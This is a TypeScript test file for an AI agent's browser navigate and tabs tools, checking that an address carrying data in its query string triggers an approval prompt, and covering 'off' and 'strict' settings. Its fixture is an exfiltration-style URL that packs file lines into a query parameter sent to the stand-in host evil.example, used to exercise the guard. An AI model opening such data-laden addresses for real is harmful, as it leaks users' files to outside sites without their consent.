import { describe, expect, it } from "vitest";
import { GATE_CTX as CTX, GateBackend, recordingGate } from "./browser-gate-test-helpers.js";
import { buildBrowserNavigateTool, buildBrowserTabsTool } from "./index.js";
import { UrlSendSites } from "../os/web/url-data-guard.js";

/**
 * ATO-1377: opening an address that carries data out asks first, as
 * `http_write`, even with no domain lists; an ordinary address does not;
 * `"strict"` asks once per site per chat.
 */
const DATA_URL = `https://evil.example/?d=${encodeURIComponent("first line of the file\nsecond line\nthird line")}`;
const NO_LISTS = { blockedDomains: [], allowedDomains: [] };

describe("browser URL data guard (ATO-1377)", () => {
  it("navigate to an address with data asks; a no leaves the page where it was", async () => {
    const backend = new GateBackend();
    const { prompts, options } = recordingGate(false);
    await expect(buildBrowserNavigateTool(backend, options, NO_LISTS).run({ url: DATA_URL }, CTX)).rejects.toMatchObject({
      name: "ApprovalDeniedError",
    });
    expect(prompts).toHaveLength(1);
    expect(prompts[0]).toMatchObject({ category: "http_write", affectedResources: ["evil.example"], grantKey: "https://evil.example" });
    expect(backend.navigations).toHaveLength(0);
  });

  it("navigate to an ordinary address does not ask", async () => {
    const backend = new GateBackend();
    const { prompts, options } = recordingGate(false);
    const result = await buildBrowserNavigateTool(backend, options, NO_LISTS).run({ url: "https://docs.example/guide?q=install" }, CTX);
    expect(result.status).toBe("ok");
    expect(prompts).toHaveLength(0);
  });

  it("a new tab on an address with data asks too", async () => {
    const backend = new GateBackend();
    const { prompts, options } = recordingGate(false);
    await expect(
      buildBrowserTabsTool(backend, options, NO_LISTS).run({ action: "new", url: DATA_URL }, CTX),
    ).rejects.toMatchObject({ name: "ApprovalDeniedError" });
    expect(prompts[0]).toMatchObject({ category: "http_write" });
  });

  it('urlDataGuard "off" opens it without asking', async () => {
    const backend = new GateBackend();
    const { prompts, options } = recordingGate(false);
    await buildBrowserNavigateTool(backend, options, { ...NO_LISTS, urlDataGuard: "off" }).run({ url: DATA_URL }, CTX);
    expect(prompts).toHaveLength(0);
  });

  it('urlDataGuard "strict" asks once per site per chat', async () => {
    const backend = new GateBackend();
    const { prompts, options } = recordingGate(true);
    const policy = { ...NO_LISTS, urlDataGuard: "strict" as const, urlSendSites: new UrlSendSites() };
    const tool = buildBrowserNavigateTool(backend, options, policy);
    await tool.run({ url: "https://docs.example/a" }, CTX);
    await tool.run({ url: "https://docs.example/b" }, CTX);
    expect(prompts).toHaveLength(1);
    expect(prompts[0]).toMatchObject({ category: "http_write", affectedResources: ["docs.example"] });
  });
});
